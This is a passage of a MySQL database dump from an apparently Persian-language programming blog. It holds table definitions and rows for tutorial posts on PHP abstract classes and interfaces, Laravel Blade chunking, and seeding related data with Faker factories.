-- MySQL dump 10.16  Distrib 10.1.24-MariaDB, for Linux (x86_64)
--
-- Host: 127.0.0.1    Database: saeednas_db
-- ------------------------------------------------------
-- Server version	10.1.24-MariaDB-cll-lve

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `blog_category`
--

DROP TABLE IF EXISTS `blog_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `blog_category` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `blog_id` int(10) unsigned NOT NULL,
  `category_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `blog_category_blog_id_foreign` (`blog_id`),
  KEY `blog_category_category_id_foreign` (`category_id`),
  CONSTRAINT `blog_category_blog_id_foreign` FOREIGN KEY (`blog_id`) REFERENCES `blogs` (`id`),
  CONSTRAINT `blog_category_category_id_foreign` FOREIGN KEY (`category_id`) REFERENCES `categories` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blog_category`
--

LOCK TABLES `blog_category` WRITE;
/*!40000 ALTER TABLE `blog_category` DISABLE KEYS */;
INSERT INTO `blog_category` VALUES (1,11,2),(2,11,1),(3,12,2),(4,12,1),(5,13,2),(6,13,1),(7,14,2),(8,14,1);
/*!40000 ALTER TABLE `blog_category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blog_related`
--

DROP TABLE IF EXISTS `blog_related`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `blog_related` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `blog_id` int(10) unsigned NOT NULL,
  `blog_related_id` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `blog_related_blog_id_foreign` (`blog_id`),
  KEY `blog_related_blog_related_id_foreign` (`blog_related_id`),
  CONSTRAINT `blog_related_blog_id_foreign` FOREIGN KEY (`blog_id`) REFERENCES `blogs` (`id`),
  CONSTRAINT `blog_related_blog_related_id_foreign` FOREIGN KEY (`blog_related_id`) REFERENCES `blogs` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blog_related`
--

LOCK TABLES `blog_related` WRITE;
/*!40000 ALTER TABLE `blog_related` DISABLE KEYS */;
INSERT INTO `blog_related` VALUES (2,11,12,'2017-12-03 07:32:27','2017-12-03 07:32:27'),(3,11,9,'2017-12-03 07:32:27','2017-12-03 07:32:27');
/*!40000 ALTER TABLE `blog_related` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blog_tag`
--

DROP TABLE IF EXISTS `blog_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `blog_tag` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `blog_id` int(10) unsigned NOT NULL,
  `tag_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `blog_tag_blog_id_foreign` (`blog_id`),
  KEY `blog_tag_tag_id_foreign` (`tag_id`),
  CONSTRAINT `blog_tag_blog_id_foreign` FOREIGN KEY (`blog_id`) REFERENCES `blogs` (`id`),
  CONSTRAINT `blog_tag_tag_id_foreign` FOREIGN KEY (`tag_id`) REFERENCES `tags` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=42 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blog_tag`
--

LOCK TABLES `blog_tag` WRITE;
/*!40000 ALTER TABLE `blog_tag` DISABLE KEYS */;
INSERT INTO `blog_tag` VALUES (1,1,1),(2,2,1),(3,2,2),(4,2,3),(5,3,2),(6,3,1),(7,3,4),(8,4,2),(9,4,1),(10,4,5),(11,6,5),(12,6,2),(13,6,1),(14,5,5),(15,5,2),(16,5,1),(17,7,3),(18,7,2),(19,7,1),(20,7,6),(21,7,7),(22,7,8),(23,9,2),(24,9,1),(25,10,1),(26,12,5),(27,11,5),(28,11,2),(29,11,1),(30,11,9),(31,12,7),(32,12,2),(33,12,1),(34,13,7),(35,13,5),(36,13,2),(37,13,1),(38,14,2),(39,14,1),(40,14,10),(41,14,11);
/*!40000 ALTER TABLE `blog_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blogs`
--

DROP TABLE IF EXISTS `blogs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `blogs` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `content` text COLLATE utf8_unicode_ci,
  `image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `author_id` int(10) unsigned NOT NULL,
  `meta_keywords` text COLLATE utf8_unicode_ci,
  `meta_description` text COLLATE utf8_unicode_ci,
  `comments_enabled` tinyint(1) NOT NULL DEFAULT '0',
  `show_in_home` tinyint(1) NOT NULL DEFAULT '0',
  `hits` int(11) NOT NULL DEFAULT '0',
  `state` int(11) NOT NULL DEFAULT '0',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `published_at` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `blogs_author_id_foreign` (`author_id`),
  KEY `blogs_created_by_foreign` (`created_by`),
  KEY `blogs_updated_by_foreign` (`updated_by`),
  CONSTRAINT `blogs_author_id_foreign` FOREIGN KEY (`author_id`) REFERENCES `users` (`id`),
  CONSTRAINT `blogs_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `blogs_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blogs`
--

LOCK TABLES `blogs` WRITE;
/*!40000 ALTER TABLE `blogs` DISABLE KEYS */;
INSERT INTO `blogs` VALUES (1,'Abstract classها، abstract methodها و interfaceها','abstract-classes-interfaces','<p>اگر مدتی باشه که با php کار می‌کنید، حتما راجع به classهای پایه، abstract classها، abstract methodها و interfaceها شنیده‌اید. بیشتر فریم‌ورک‌های مشهور، شما رو به کدنویسی با interfaceها تشویق می‌کنند، اما خب interface چه معنی‌ای می‌دهد و کی باید با abstract classها برنامه رو نوشت و یا کی باید یک abstract method را تعریف کرد؟</p><p>همه‌ی ما بارها تعاریف اینها رو خوانده‌ایم، اما نحوه استفاده‌شون رو شاید ندونیم، پس بهتره با یک مثال عملی پیش بریم. شما هیچ ماشین، حیوان یا هر چیز استعاری رو تو دنیای کد نمی‌بینید که بشه اونها رو یه مثال مناسب برای این تعاریف دونست، پس یه مثال کوچیک اما کاربردی و قابل پیاده سازی رو تعریف می‌کنیم تا درک کاملی از تعاریفمون پیدا کنیم؛ «اپلیکیشنی که نیاز دارد به کاربرانش ایمیل بفرستد.»</p><p>پس در ابتدا، کلاسی به صورت زیر تعریف می‌کنیم:</p>\r\n<pre><code class=\"php hljs\">\r\nclass BasicEmail \r\n{\r\n    private $email;\r\n\r\n    private $body;\r\n\r\n    public function setEmail($email)\r\n    {\r\n        $this->email = $email;\r\n    }\r\n\r\n    public function setBody($body)\r\n    {\r\n        $this->body = $body;\r\n    }\r\n\r\n    protected function isValid()\r\n    {\r\n        return is_email($this->email) && strlen($this->body) > 0;\r\n    }\r\n\r\n    public function attempt()\r\n    {\r\n        if($this->isValid())\r\n        {\r\n            $this->send();\r\n        }\r\n    }\r\n\r\n    public function send()\r\n    {\r\n        //use $email and $body to send email\r\n    }\r\n}\r\n\r\n//elsewhere in your application\r\n\r\n$email = new BasicEmail;\r\n$email->setEmail(\'johnDoe@gmail.com\');\r\n$email->setBody(\'Thanks for joining CatLoverApp, the social media platform to show off your cat!\');\r\n$email->attempt();\r\n</code></pre>\r\n<p>خب، ما از برنامه‌نویسی شی‌گرا استفاده کردیم و حالا ادامه‌ش میدیم. کاربران شما می‌خوان که وقتی دوستانشون تصاویر گربه‌هاشون رو پست کردند، ایمیلی دریافت کنند. همه چیز به نظر خوب میاد، جز زمانی که برخی از کاربران تقاضای دریافت SMS هم علاوه بر ایمیل داشته باشند. پس یه کلاس جدید داریم:</p>\r\n<pre><code class=\"php hljs\">\r\nclass SMS \r\n{\r\n    private $phone;\r\n\r\n    private $text;\r\n\r\n    public function setPhone($phone)\r\n    {\r\n        $this->phone = $phone;\r\n    }\r\n\r\n    public function setText($text)\r\n    {\r\n        $this->text = $text;\r\n    }\r\n\r\n    protected function isValid()\r\n    {\r\n        return is_phone($this->phone) && strlen($this->text) > 0;\r\n    }\r\n\r\n    public function attempt()\r\n    {\r\n        if($this->isValid())\r\n        {\r\n            $this->send();\r\n        }\r\n    }\r\n\r\n    public function send()\r\n    {\r\n        //use Twilio to send SMS\r\n    }\r\n}\r\n\r\n//elsewhere in your application\r\n\r\n$sms = new SMS;\r\n$sms->setPhone(\'123-456-7890\');\r\n$sms->setText(\'Bob, just posted a pic of his cat!\');\r\n$sms->attempt();\r\n</code></pre>\r\n<p style=\"direction: rtl;\">خب حالا می‌تونیم به کاربرامون ایمیل و SMS بفرستیم اما کلاس‌هامون خیلی ساده‌اند و در عین حال کاملا رضایت‌بخش هم نیستند. هر دو دارای <code>destination</code>و <code>text</code> و <code>()isValid</code>و<code>()attempt</code> و متود <code>()send</code> هستند. این واقعا مثال خوبیه برای فهم بهتر یک abstract class:</p>\r\n<pre><code class=\"php hljs\">\r\nabstract class Message \r\n{\r\n    private $destination;\r\n\r\n    private $content;\r\n\r\n    public function setDestination($destination)\r\n    {\r\n        $this->destination = $destination;\r\n    }\r\n\r\n    public function setContent($content)\r\n    {\r\n        $this->content = $content;\r\n    }\r\n\r\n    public function attempt()\r\n    {\r\n        if($this->isValid()) {\r\n            $this->send();\r\n        }\r\n    }\r\n\r\n    abstract protected function isValid();\r\n\r\n    abstract public function send();\r\n}\r\n\r\nclass BasicEmail extends Message \r\n{\r\n    protected function isValid()\r\n    {\r\n        return is_email($this->destination) && strlen($this->content) > 0;\r\n    }\r\n\r\n    public function send()\r\n    {\r\n        //use $this->destination and $this->content to send email\r\n    }\r\n}\r\n\r\nclass SMS extends Message \r\n{   \r\n    protected function isValid()\r\n    {\r\n        return is_phone($this->destination) && strlen($this->content) > 0;\r\n    }\r\n\r\n    public function send()\r\n    {\r\n        //use $this->destination and $this->content to send SMS\r\n    }\r\n}\r\n\r\n//\r\n\r\n$message = new Message; //Invalid, won\'t work because it\'s abstract!\r\n\r\n$message1 = new BasicEmail;\r\n$message1->setDestination(\'johnDoe@gmail.com\');\r\n$message1->setContent(\'Sorry, Susan just de-friended you!\');\r\n$message1->attempt();\r\n\r\n$message2 = new SMS;\r\n$message2->setDestination(\'123-456-7890\');\r\n$message2->setContent(\'Sorry, Susan just de-friended you!\');\r\n$message2->attempt();\r\n</code></pre>\r\n<p>ما وقتی از abstract classها استفاده می‌کنیم که objectهای مشابه داشته باشیم که برخی قابلیت‌ها را تفاوت‌های خیلی جزئی به اشتراک بزارن یا انجامش بدن. در کلاس Message ما یه زوج از abstract methodها تعریف کردیم و یک اجبار برای همه کلاسهایی که از Message توسعه داده میشن، بوجود میاریم تا اجبارا متودهای <code>()send</code> و <code>()isValid</code> رو پیاده‌سازی کنند. کلاس Message به این که چطوری ارسال و اعتبار‌سنجی انجام میشه، کاری نداره، فقط براش مهمه که این قابلیت وجود داشته باشه. ذکر این نکته هم خوبه که abstract classها و interfaceها می‌تونن متودها رو با انواعی از visibility تعریف کنن، مثله public، protected و یا private. اینجا <code>()isValid</code> شاید بتونه public هم باشه. فقط یه نکته رو بگم:</p>\r\n\r\n<div class=\"alert alert-warning\"><p><strong>اخطار!</strong> شما نمی‌تونید یک abstract class را instantiate کنید. چون خیلی مبهم هستند و این یعنی باید اونها رو توسعه بدید.</p></div>\r\n\r\n<div class=\"alert alert-info\"><p><strong>نکته!</strong> اگر در یک کلاس، یک متود abstract تعریف شده باشه، خود کلاس <strong>حتما</strong> باید abstract باشه، با این حال میشه کلاسی رو abstract تعریف کرد، بدون اینکه متود abstract داشته باشه، که اگرچه غیرمعموله، اما غیرمجاز نیست.</p></div>\r\n\r\n<h3>صف پیام‌ها</h3>\r\n<p>ما نمی‌تونیم آینده رو پیش‌بینی کنیم و بدونیم که کاربرامون در آینده چی می‌خوان، مثلا یه تماس واقعی، معلوم نیست، اما می‌دونیم گزینه‌های اطلاع‌رسانی رو دوست دارن و خیلیاش رو میخوان.</p><p>حالا چند نوع از صف پیام‌ها را ایجاد می‌کنیم. اولین ارسال پیام می‌تونه اینطوری باشه:</p>\r\n<pre><code class=\"php hljs\">\r\n$messages = array();\r\n\r\n$messages[] = $message1;\r\n$messages[] = $message2;\r\n\r\n/** other application code **/\r\n\r\nforeach ($messages as $message) {\r\n    $message->attempt();    \r\n}\r\n</code></pre>\r\n<p>درست کار می‌کنه، اما می‌تونه خیلی بهتر باشه. فرض کنید یکی از همکارانتون، <code>messages$</code> رو ببینه و به اون <code>$messages[] = \"You\'ve been awarded a badge!\"?</code> را اضافه کنه، چی میشه؟ مشکل پیش میاد. ممکنه اون نتونسته باشه تیکه کد ارسال پیام‌ها رو ببینه و ندونه تابع <code>()attempt</code> چه چیزی رو به عنوان ورودی انتظار داره. برای همین، و رفع این مشکل بازسازی زیر رو انجام می‌دیم:</p>\r\n<pre><code class=\"php hljs\">\r\nclass MessageQueue \r\n{\r\n    private $messages = array();\r\n\r\n    public function add(Message $message)\r\n    {\r\n        $this->messages[] = $message;\r\n    }\r\n\r\n    public function sendAll()\r\n    {\r\n        foreach ($this->messages as $message) {\r\n            $message->attempt();\r\n        }\r\n    }\r\n}\r\n</code></pre>\r\n<p>به نظرم خیلی بهتر شد. ما تابع <code>()add</code> رو type-hinting اضافه کردیم تا همکارانمون بدونن آبجکت‌های Message (چه BasicEmail و چه SMS) قابل پذیرش هستند.</p>\r\n\r\n<h3>Extending functionality</h3>\r\n<p>من ایده‌ی MessageQueue رو دوست دارم. اصالتا کاری نداره که چه نوع پیامی رو باید بفرسته، فقط نیاز می‌دونه که اونها رو ارسال کنه. خب حالا می‌تونیم واقعا از کاربرامون بخوایم که از سرویسمون استفاده کنن و برای هر تصویری که از هر گربه‌ای می‌زارن، ۵ واحد جایزه بگیرند.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\nclass PhotoReward \r\n{\r\n    private $amount;\r\n\r\n    private $recipient;\r\n\r\n    public function setAmount($amount)\r\n    {\r\n        $this->amount = $amount;\r\n    }\r\n\r\n    public function setRecipient($recipient)\r\n    {\r\n        $this->recipient = $recipient;\r\n    }\r\n\r\n    public function reward()\r\n    {\r\n        //use paypal to send reward to recipient\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p>به نظر می‌رسه شرایط Message رو نداره، اما چطور میشه اگر بتونیم تو Queue ازش استفاده کنیم؟ Interfaceها. یک interface نیازمندی‌های مشخصی رو به کلاس‌ها اعمال می‌کنه که فرم مشخصی از متودها پیاده شوند، مانند abstract methodها با این تفاوت که interface هیچ پیاده‌سازی از کد ندارد. یک مزیت استفاده از interfaceها این است که می‌تونیم اون رو به کلاس‌های موجودمون، متصل کنیم. یک کلاس فقط می‌تونه از یک کلاس دیگه پیاده‌سازی بشه یعنی فقط می‌تونه یک والد داشته باشه. در حالی که میتونن تعداد بیشماری از interfaceها رو پیاده سازی کنند. </p>\r\n\r\n<div class=\"alert alert-info\"><p>حقیقت اینه که Interfaceها می‌توانند به وسیله دیگر interfaceها extend بشوند. من فکر نمیکنم یه همچین موردی رو تا حالا دیده باشم، اما به هر حال امکان پذیر هست. معمولا خیلی واضح‌تره اگر کلاس‌هاتون از چندین interface پیاده‌سازی شوند.</p></div>\r\n\r\n<p>اکنون یک interface event تعریف می‌کنیم.</p>\r\n<pre><code class=\"php hljs\">\r\ninterface Event \r\n{\r\n    public function fire();\r\n}\r\n</code></pre>\r\n<p>همینطور که می‌بینید، هیچ تعریفی برای متود <code>()fire</code> وجود ندارد، هر کلاسی که از این interface استفاده یا پیاده سازی کنه، مجبور خواهد بود که متود <code>()fire</code> را تعریف کند. اکنون وقت بازسازی کلاس queue است. می‌خواهیم با استفاده از interface event آنرا کمی عمومی کنیم.</p>\r\n<pre><code class=\"php hljs\">\r\nclass EventQueue \r\n{\r\n  private $events = array();\r\n\r\n  public function add(Event $event)\r\n  {\r\n    $this->events[] = $event;\r\n  }\r\n\r\n  public function fireAll()\r\n  {\r\n    foreach ($this->events as $event) {\r\n      $event->fire();\r\n    }\r\n  }\r\n}\r\n</code></pre>\r\n<p>حالا classهای Message و PhotoReward را با استفاده از interface بازسازی می کنیم.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\nabstract class Message implements Event \r\n{\r\n    private $destination;\r\n\r\n    private $content;\r\n\r\n    public function setDestination($destination)\r\n    {\r\n        $this->destination = $destination;\r\n    }\r\n\r\n    public function setContent($content)\r\n    {\r\n        $this->content = $content;\r\n    }\r\n\r\n    public function attempt()\r\n    {\r\n        if($this->isValid()) {\r\n            $this->send();\r\n        }\r\n    }\r\n\r\n    public function fire()\r\n    {\r\n        $this->attempt();\r\n    }\r\n\r\n    abstract protected function isValid();\r\n\r\n    abstract public function send();\r\n}\r\n\r\nclass PhotoReward implements Event \r\n{\r\n    private $amount;\r\n\r\n    private $recipient;\r\n\r\n    public function setAmount($amount)\r\n    {\r\n        $this->amount = $amount;\r\n    }\r\n\r\n    public function setRecipient($recipient)\r\n    {\r\n        $this->recipient = $recipient;\r\n    }\r\n\r\n    public function fire()\r\n    {\r\n        $this->reward();\r\n    }\r\n\r\n    public function reward()\r\n    {\r\n        //use paypal to send reward to user\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p>چند نکته هست که اینجا باید بگیم:</p>\r\n<p>متوجه خواهید شد که ما نیازی به کلاس BasicEmail و SMS نداریم. ما interface را در کلاس abstract والد Message ست می‌کنیم. متود جدید <code>()fire</code> تنها متود <code>()attempt</code> را شامل می‌شود. این ممکن است به نظر بی فایده باشد، اما اکنون ما قادر هستیم که این کلاس رویدادها را فراخوانی کنیم.</p>\r\n\r\n<p>ما می توانیم interface را در Message نگه داشته و متود <code>()fire</code> را برداریم، زیرا Message یک کلاس abstract است. در تمام مدت پیاده سازی، BasicEmail و SMS، متود <code>()fire</code> خود را پیاده می‌کنند، به interface نیز پایبند خواهند بود. کلیه الزامات abstract در نهایت به پیاده سازی های پایه‌ای آنها بستگی دارد.</p>\r\n\r\n<p>ما یک interface را در کلاس abstract و یک کلاس پایه پیاده سازی کردیم و هر دو نیز معتبر هستند.</p>\r\n<p>بزارید ببینیم حالا چه می‌توانیم بکنیم؟</p>\r\n<pre><code class=\"php hljs\">\r\n$queue = new EventQueue;\r\n\r\n$event1 = new BasicEmail;\r\n$event1->setDestination(\'johnDoe@gmail.com\');\r\n$event1->setContent(\'Sorry, Susan just de-friended you!\');\r\n\r\n$queue->add($event1);\r\n\r\n$event2 = new SMS;\r\n$event2->setDestination(\'123-456-7890\');\r\n$event2->setContent(\'Sorry, Susan just de-friended you!\');\r\n\r\n$queue->add($event2);\r\n\r\n$event3 = new PhotoReward;\r\n$event3->setRecipient($bob);\r\n$event3->setAmount(5);\r\n\r\n$queue->add($event3);\r\n\r\n$queue->fireAll();\r\n</code></pre>\r\n\r\n<p>از آنجا که هر شیء به interface رویداد پایبند است، می‌توانیم آنها را به queue اضافه کنیم و queue می‌تواند به متود <code>()fire</code> همه آن objectها متصل شود.</p>\r\n<h3>Inception</h3>\r\n<p>می‌خواهیم ابعاد جدیدی به EventQueue اضافه کنیم. توجه کنید که ما یک متود <code>()fireAll</code> داریم. این کلاس نیز یک event محسوب می شود. بنابراین وقت آن است که واقعا از برخی از مزایای برنامه نویسی شی گرا استفاده کنیم.</p>\r\n\r\n<p>EventQueue جدید و بهبود یافته ما می تواند چنین چیزی باشد.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\nclass EventQueue implements Event \r\n{\r\n    private $events = array();\r\n\r\n    public function add(Event $event)\r\n    {\r\n        $this->events[] = $event;\r\n    }\r\n\r\n    public function fire()\r\n    {\r\n        foreach ($this->events as $event) {\r\n            $event->fire();\r\n        }\r\n    }\r\n}\r\n</code></pre>\r\n<p>حالا باید بدونیم که این مفاهیم برای چی به وجود آمدند؟یک سازمان و خواسته‌هایش شاید بهترین تشریح برای ایجاد این مفاهیم باشد.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$messageQueue = new EventQueue;\r\n$rewardQueue  = new EventQueue;\r\n\r\n$email = new BasicEmail;\r\n$email->setDestination(\'johnDoe@gmail.com\');\r\n$email->setContent(\'Congrats, you\\\'re the cat lover of the month!\');\r\n\r\n$messageQueue->add($email);\r\n\r\n$sms = new SMS;\r\n$sms->setDestination(\'123-456-7890\');\r\n$sms->setContent(\'Congrats, you\\\'re the cat lover of the month!\');\r\n\r\n$messageQueue->add($sms);\r\n\r\n$photoReward = new PhotoReward;\r\n$photoReward->setRecipient($bob);\r\n$photoReward->setAmount(5);\r\n\r\n$rewardQueue->add($photoReward);\r\n\r\n$badgeReward = new BadgeReward;\r\n$badgeReward->setRecipient($spencer);\r\n\r\n$rewardQueue->add($badgeReward);\r\n\r\n$masterQueue = new EventQueue;\r\n$masterQueue->add($messageQueue);\r\n$masterQueue->add($rewardQueue);\r\n\r\n//fire events in both queues\r\n$masterQueue->fire();\r\n\r\n//or only fire events in $messageQueue\r\n$messageQueue->fire();\r\n\r\n//or only fire events in $rewardQueue\r\n$rewardQueue->fire();\r\n</code></pre>\r\n\r\n<p>اکنون ما می توانیم هر treat را به صورت جداگانه یا همه را در یک زمان اداره کنیم. در حال حاضر این امکان که صف ها را داخل یکدیگر قرار دهیم وجود دارد.</p>\r\n\r\n<p>یک اثر جانبی استفاده از abstract classها و interfaceها، داشتن کد بسیار مدولار و قابل توسعه است. برای ایجاد یک Message جدید، ما فقط باید کلاس Message را extend کنیم و متود های <code>()send</code> و <code>()isValid</code> را پیاده کنیم.</p>','1510598689abs-interface.jpg',1,'php, laravel, object oriented','Abstract classها، abstract methodها و interfaceها',0,1,101,1,1,1,'2017-11-13 00:00:00','2017-04-17 13:48:51','2017-11-14 12:58:00',NULL),(2,'تقسیم نتایج در blade با استفاده از chunks','تقسیم-نتایج-در-blade-با-استفاده-از-chunks','<p>شرایطی رو تصور کنید که می‌‌خواهید نتایج به دست آمده در یک blade را به دو قسمت تقسیم کنید، یک result ده تایی در دو قسمت ۵ تایی نمایش داده شود. برای این کار یک روش ساده در حلقه @foreach وجود دارد.</p><p>شرح مجدد، شما یک آرایه با ۱۰ رکورد دارید که می‌خواهید آنها را به شکل زیر نمایش دهید: <br></p><p>بخش اول<br></p>\r\n\r\n<ul>\r\n<li>Item 1</li>\r\n<li>Item 2</li>\r\n<li>Item 3</li>\r\n<li>Item 4</li>\r\n<li>Item 5</li>\r\n</ul>\r\n\r\n<p>بخش دوم<br></p>\r\n<ul>\r\n<li>Item 6</li>\r\n<li>Item 7</li>\r\n<li>Item 8</li>\r\n<li>Item 9</li>\r\n<li>Item 10</li>\r\n</ul>\r\n\r\n\r\n<p>راه مستقیم - استفاده از یک متغیر $loop است:</p><p><br></p>\r\n\r\n<pre><code class=\"php hljs\">\r\n@foreach($items as $item)\r\n    @if($loop->first or $loop->iteration % 5 == 0)\r\n       <‌ul‌‌>\r\n    @endif\r\n    <‌li‌>\r\n        Item {{ $loop->iteration }}\r\n    <‌/li‌>\r\n    @if($loop->last == true or $loop->iteration % 5 == 0)\r\n       <‌/ul‌>\r\n    @endif\r\n@endforeach\r\n</code></pre>\r\n\r\n<p>اما یک راه بهتر وجود دارد - استفاده از تابع chunk() در کلکشن ها:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n@foreach($items->chunk(5) as $chunk)\r\n    < ul >\r\n        @foreach($chunk as $item)\r\n            Item {{ $loop->iteration }}\r\n        @endforeach\r\n   < /ul >\r\n@endforeach\r\n</code></pre>\r\n\r\n<p>شما می‌توانید در <a href=\"https://laravel.com/docs/5.5/collections#method-chunk\">اینجا</a> درباره تابع chunk() بیشتر بخوانید.</p>','1511109662chunk.jpg',1,'blade, laravel, chunks','تقسیم نتایج در blade با استفاده از chunks',0,1,49,1,1,1,'2017-10-08 15:22:43','2017-10-15 08:23:40','2017-11-19 13:11:02',NULL),(3,'لاراول: دو راه برای درج دیتای پیش فرض و رابطه دار','لاراول-دو-راه-برای-درج-دیتای-پیش-فرض','<p>هنگام گذاشتن دیتا، خیلی پیش میاد که به ازای هر جدول در دیتابیس یک کلاس داشته باشیم. اما چه اگر با هم رابطه داشته باشند، چه؟ من برای این کار دو راه به شما یاد خواهم داد.</p><p>فرض کنید ما یک دیتابیس ساده با این مشخصات داشته باشیم:</p><p><img src=\"http://laraveldaily.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-16-at-7.31.52-AM-768x408.png\" style=\"width: 629px;\"><br></p>\r\n\r\n<p>جدول های <b>contacts</b> و <b>contact_companies </b>که یک رابطه 1 به N با هم دارند.</p><p>حالا چگونه در دو جدول دیتای پیش فرض درج کنیم؟</p><p>البته که ما از کتابخانه Faker استفاده خواهیم کرد، گرچه برای این کار راههای دیگری هم هست.</p><p>ابتدا ما <a href=\"https://laravel.com/docs/5.5/database-testing#writing-factories\">factories</a> را تعریف می کنیم:</p><p><br></p>\r\n\r\n<p style=\"direction: rtl;\"><b>database/factories/ContactCompanyFactory.php:</b></p>\r\n\r\n\r\n<pre><code class=\"php hljs\">\r\n$factory->define(App\\ContactCompany::class, function (Faker\\Generator $faker) {\r\n    return [\r\n        \'name\' => $faker->name,\r\n        \'address\' => $faker->address,\r\n        \'website\' => \'https://\' . $faker->word . \'.com\',\r\n        \'email\' => $faker->email,\r\n    ];\r\n});\r\n</code></pre>\r\n\r\n<p>و <b>database/factories/ContactFactory.php</b>:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$factory->define(App\\Contact::class, function (Faker\\Generator $faker) {\r\n    return [\r\n        \'first_name\' => $faker->firstName(),\r\n        \'last_name\' => $faker->lastName,\r\n        \'phone1\' => $faker->phoneNumber,\r\n        \'phone2\' => $faker->phoneNumber,\r\n        \'email\' => $faker->email,\r\n        \'skype\' => $faker->word,\r\n        \'address\' => $faker->address,\r\n    ];\r\n});\r\n</code></pre>\r\n\r\n<p>همینطور که می بینید، ما هیچ contacts.company_id را تعریف نکرده ایم. خب اینجا ما چند گزینه داریم:</p>\r\n\r\n<b>روش اول: ایجاد contact در seed مربوط به company</b>\r\n\r\n<p>ابتدا برای company یک seeder ایجاد می کنیم:</p>\r\n\r\n<pre><code class=\"php hljs\">php artisan make:seeder CompanySeed</code></pre>\r\n\r\n<p>سپس فایل database/seeds/CompanySeed.php را مانند زیر پر می کنیم:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\npublic function run()\r\n{\r\n    factory(App\\ContactCompany::class, 10)->create()->each(function ($company) {\r\n        $company->contacts()->save(factory(App\\Contact::class)->make());\r\n    });\r\n}\r\n</code></pre>\r\n\r\n<p>در کل، ما ۱۰ کمپانی ایجاد کردیم که به ازای هر کمپانی، یک contact هم با استفاده از رابطه Eloquent در app/ContactCompany.php نیز ساختیم.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\npublic function contacts()\r\n{\r\n    return $this->hasMany(Contact::class, \'company_id\');\r\n}\r\n</code></pre>\r\n\r\n<hr>\r\n<p>روش دوم: ساخت company و در کنارش contact</p><p>راه دیگر این است که از seed برای contact استفاده کنید.<br></p>\r\n<pre><code class=\"php hljs\">php artisan make:seeder ContactSeed</code></pre>\r\n \r\n<p>و سپس اضافه کردن این خط در فایل database/seeds/ContactSeed.php:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\npublic function run()\r\n{\r\n    factory(App\\Contact::class, 10)->create();\r\n}\r\n</code></pre>شما احتمالا تعجب کردید که این روابط از کجا می آیند؟ ما می توانیم مستقیما در factory هم یک parent ایجاد کنیم. به شکل زیر:<p>database/factories/ContactFactory.php:</p>\r\n\r\n<pre><code class=\"php 